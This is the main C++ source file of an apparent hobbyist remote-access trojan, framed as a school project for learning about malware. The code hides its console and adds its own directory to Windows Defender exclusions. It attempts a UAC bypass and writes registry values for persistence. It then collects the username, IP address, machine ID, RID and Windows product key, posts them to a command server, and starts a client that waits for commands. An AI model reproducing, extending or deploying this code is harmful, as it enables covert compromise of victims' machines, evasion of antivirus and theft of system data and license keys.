/*
This code is created for learning about malware. I have been using it to study hardware.
If I made any mistakes, I apologize for that. The code might not be perfect because I am also learning C++.

This project is part of a Science subject for the Presence Project.
Code written by Mikasuru (github.com/Mikasuru)
----------------------------------------------------------------
The project is built on a client-server model where a Node.js backend manages command distribution while C++ clients handle execution.
Main.cpp serves as the entry point, initializing core components and establishing webhook communications.
The server component (app.js) handles client registration, command distribution, and maintains the web interface.
*/
#include <iostream>
#include "Module/Logger.hpp"
#include "Extension/Payload/Payload.hpp"
#include "Extension/GetDevice/Hardware.hpp"
#include "Extension/Bot/HttpClient.hpp"
#include "Module/AutoElevate.hpp"

using namespace std;

string username = Hardware::GetUsername();
string ipAddress = Hardware::GetIPAddress();
string machineID = Hardware::GetMachineID();
string rid = Hardware::GetRelativeIdentifier();
string windowsVersion = Hardware::GetWindowsVersion();
string windowsKey = Hardware::GetWindowsKey();
string profilePicPath = Hardware::GetUserProfilePicture();

std::string url = "http://localhost:3000/register";

void Exclusion(const std::string& path) {
    std::string command = "powershell -Command \"Add-MpPreference -ExclusionPath '" + path + "'\"";

    int result = system(command.c_str());

    if (result == 0) {
        Logger::getInstance()->info("Successfully added to Windows Defender exclusion: " + path);
    }
    else {
        Logger::getInstance()->expection("Failed to add exclusion. Make sure you run this program as Administrator");
        std::cerr << "Failed to add exclusion. Make sure you run this program as Administrator.\n";
    }
}

std::string getExecutablePath() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    return std::string(path);
}

int main() {
    try {
        //HWND console = GetConsoleWindow();
        //ShowWindow(console, SW_HIDE);

        STARTUPINFOA si = { sizeof(si) };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        SetConsoleMode(GetStdHandle(STD_OUTPUT_HANDLE), 0);
        SetConsoleMode(GetStdHandle(STD_ERROR_HANDLE), 0);

        std::string executable = getExecutablePath();
        std::string Dir = executable.substr(0, executable.find_last_of("\\/"));

        Exclusion(Dir);

        Logger::getInstance()->info("Program started");

        if (!AutoElevate::isAdmin()) {
            Logger::getInstance()->info("Not running as admin, attempting to elevate");
            if (AutoElevate::bypassUAC()) {
                Logger::getInstance()->info("UAC bypass successful");

                HKEY hKey;
                if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                    "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
                    0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {

                    std::string exePath = AutoElevate::getExecutablePath();
                    RegSetValueExA(hKey, "Kukuri", 0, REG_SZ,
                        (BYTE*)exePath.c_str(), exePath.length() + 1);
                    RegCloseKey(hKey);
                }
            }
            else {
                Logger::getInstance()->warning("UAC bypass failed");
            }
            return 0;
        }
        Logger::getInstance()->info("Running as admin"); 
        AutoElevate::elevatePrivileges();
        if (!AutoElevate::setAutoRun()) {
            Logger::getInstance()->warning("Failed to set auto run");
        }
        Logger::getInstance()->load("Initialize HTTP Client..."); // Initialize
        Logger::getInstance()->load("Starting HTTP Client..."); // Start

        // Collecting system information
        std::string username = Hardware::GetUsername();
        std::string ipAddress = Hardware::GetIPAddress();
        std::string machineID = Hardware::GetMachineID();
        std::string rid = Hardware::GetRelativeIdentifier();
        std::string windowsVersion = Hardware::GetWindowsVersion();
        std::string windowsKey = Hardware::GetWindowsKey();

        // Creating JSON Object
        nlohmann::json systemInfo = {
            {"username", username},
            {"ipAddress", ipAddress},
            {"machineID", machineID},
            {"rid", rid},
            {"windowsVersion", windowsVersion},
            {"windowsKey", windowsKey}
        };

        std::string jsonStr = systemInfo.dump();

        // Sending information to server
        HINTERNET hInternet = InternetOpenA("System Info Client",
            INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

        if (hInternet) {
            HINTERNET hConnect = InternetConnectA(hInternet, "localhost",
                3000, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

            if (hConnect) {
                HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/register",
                    NULL, NULL, NULL, 0, 0);

                if (hRequest) {
                    std::string headers = "Content-Type: application/json\r\n";
                    HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
                        (LPVOID)jsonStr.c_str(), jsonStr.length());
                    InternetCloseHandle(hRequest);
                }
                InternetCloseHandle(hConnect);
            }
            InternetCloseHandle(hInternet);
        }

        HttpClient client;
        client.start();

        return 0;
    }
    catch (const exception& e) {
        Logger::getInstance()->expection(e.what());
        return 1;
    }
}